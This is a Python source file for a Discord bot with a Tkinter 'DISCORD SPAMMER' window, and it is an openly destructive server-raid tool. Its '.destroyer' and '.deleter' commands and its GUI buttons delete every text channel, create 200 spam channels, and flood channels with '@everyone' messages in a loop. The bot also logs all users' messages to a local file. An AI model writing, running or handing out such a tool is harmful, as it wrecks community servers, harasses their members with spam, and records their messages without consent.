import discord
import tkinter as tk
import threading
import time

TOKEN = input("Enter your Discord Bot Token: ")

client = discord.Client()


@client.event
async def on_ready():
    print(f'Logged in as {client.user}')


    guild = client.guilds[0]  # Get the first guild (server) the bot is connected to
    global bot_channels
    bot_channels = [ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]

  
    if bot_channels:
        print(f"Using channel(s): {[ch.name for ch in bot_channels]}")
    else:
        print("No available text channel found.")
        return


@client.event
async def on_message(message):

    if message.author == client.user:
        return

    with open("messages.txt", "a", encoding="utf-8") as log_file:
        log_file.write(f"[{message.channel.name}] {message.author}: {message.content}\n")


    if message.content.startswith('.change_name'):
        # Change bot's name (nickname)
        new_name = message.content[len('.change_name '):]
        if new_name:
            await message.guild.me.edit(nick=new_name)
            await message.channel.send(f'Bot nickname changed to "{new_name}"!')
        else:
            await message.channel.send('Please provide a valid new name.')

    if message.content.startswith('.channel_create'):
        # Create a new text channel with the name provided
        channel_name = message.content[len('.channel_create '):]
        if channel_name:
            guild = message.guild
            new_channel = await guild.create_text_channel(channel_name)
            await message.channel.send(f'Channel "{channel_name}" has been created!')
        else:
            await message.channel.send('Please provide a valid channel name.')

    if message.content.startswith('.destroyer'):
        # Destroy all channels and create 200 new channels, then start spamming with @everyone
        guild = message.guild


        text_channels = [channel for channel in guild.text_channels]
        for channel in text_channels:
            try:
                await channel.delete()
            except discord.errors.NotFound:
                pass  

    
        channel_name = "spammed-channel"  
        for _ in range(200):
            await guild.create_text_channel(channel_name)

      
        async def spam_channels():
            for channel in guild.text_channels:
                if channel.name == channel_name:  
                    await channel.send('@everyone I <3 skids')

        await spam_channels()
        await message.channel.send('Destroyed all channels and created 200 new channels. Spamming @everyone in them!')

    if message.content.startswith('.deleter'):

        guild = message.guild
        for channel in guild.text_channels:
            try:
                await channel.delete()
            except discord.errors.NotFound:
                pass  
        await message.channel.send('All channels have been deleted!')


async def start_bot():
    await client.start(TOKEN)


def send_message():
    message = message_entry.get()
    if message and bot_channels:
        # Send the message to all available channels
        for channel in bot_channels:
            try:
                client.loop.create_task(channel.send(message))
            except discord.errors.NotFound:
                pass  # Ignore if the channel was deleted or doesn't exist
        # Clear the text entry after sending
        message_entry.delete(0, tk.END)

def start_spam():
    """Start sending messages repeatedly (spam)"""
    message = message_entry.get()
    if not message:
        return  # Do nothing if the message is empty

    def spam():
        while spam_running:
            if bot_channels:
                for channel in bot_channels:
                    try:
                        client.loop.create_task(channel.send(message))
                    except discord.errors.NotFound:
                        pass  
            time.sleep(2)  

    
    global spam_running
    spam_running = True
    threading.Thread(target=spam, daemon=True).start()

def stop_spam():
    """Stop the spamming"""
    global spam_running
    spam_running = False

def create_channels():
    """Create multiple text channels with custom names"""
    num_channels = 200  
    channel_name = channel_name_entry.get()  
    if not channel_name:
        return  

    guild = client.guilds[0]
    for _ in range(num_channels):
        async def create():
            try:
                await guild.create_text_channel(channel_name)
            except discord.errors.NotFound:
                pass 

        
        client.loop.create_task(create())


def delete_all_channels():
    async def delete_channels():
        guild = client.guilds[0]
        for channel in guild.text_channels:
            try:
                await channel.delete()
            except discord.errors.NotFound:
                pass  
        print("All channels have been deleted!")


    client.loop.create_task(delete_channels())


window = tk.Tk()
window.title("DISCORD SPAMMER")
window.geometry("400x500")  # Set the window size


window.config(bg='black')


button_style = {'width': 25, 'height': 1, 'bg': '#4CAF50', 'fg': 'white', 'font': ('Arial', 10), 'relief': 'flat'}
label_style = {'font': ('Arial', 9), 'fg': 'white', 'bg': 'black'}


bot_name_label = tk.Label(window, text="Bot Name:", **label_style)
bot_name_label.pack(pady=5)
bot_name_entry = tk.Entry(window, width=30, font=('Arial', 10), bg='red', fg='white')
bot_name_entry.pack(pady=5)

def change_bot_name():
    new_name = bot_name_entry.get()
    if new_name:
        client.loop.create_task(client.user.edit(username=new_name))
        print(f"Bot name changed to {new_name}")


change_bot_name_button = tk.Button(window, text="Change Bot Name", command=change_bot_name, **button_style)
change_bot_name_button.pack(pady=5)


message_label = tk.Label(window, text="Message to Send:", **label_style)
message_label.pack(pady=5)
message_entry = tk.Entry(window, width=30, font=('Arial', 10), bg='red', fg='white')
message_entry.pack(pady=10)


send_button = tk.Button(window, text="Send Message to All Channels", command=send_message, **button_style)
send_button.pack(pady=5)


spam_button = tk.Button(window, text="Start Spamming All Channels", command=start_spam, **button_style)
spam_button.pack(pady=5)


stop_spam_button = tk.Button(window, text="Stop Spamming", command=stop_spam, **button_style)
stop_spam_button.pack(pady=5)


channel_name_label = tk.Label(window, text="Channel Name:", **label_style)
channel_name_label.pack(pady=5)
channel_name_entry = tk.Entry(window, width=30, font=('Arial', 10), bg='red', fg='white')
channel_name_entry.pack(pady=5)


create_channel_button = tk.Button(window, text="Create Spam Channels", command=create_channels, **button_style)
create_channel_button.pack(pady=5)


deleter_button = tk.Button(window, text="Deleter", command=delete_all_channels, **button_style)
deleter_button.pack(pady=5)


import threading
threading.Thread(target=client.loop.run_until_complete, args=(start_bot(),), daemon=True).start()


window.mainloop()
